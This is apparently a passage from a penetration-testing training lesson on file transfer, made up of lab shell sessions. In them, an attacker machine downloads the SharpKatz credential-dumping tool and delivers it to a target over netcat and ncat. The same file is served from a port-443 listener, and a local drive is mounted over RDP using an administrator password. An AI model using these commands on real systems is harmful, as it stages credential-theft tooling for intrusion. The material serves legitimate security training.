...
```shell-session
xF1NN@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
xF1NN@htb[/htb]$ # Example using Original Netcat
xF1NN@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
...
```shell-session
xF1NN@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
xF1NN@htb[/htb]$ # Example using Ncat
xF1NN@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
...
```shell-session
xF1NN@htb[/htb]$ # Example using Original Netcat
xF1NN@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
...
```shell-session
xF1NN@htb[/htb]$ # Example using Ncat
xF1NN@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
...
```shell-session
xF1NN@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
...
```shell-session
xF1NN@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
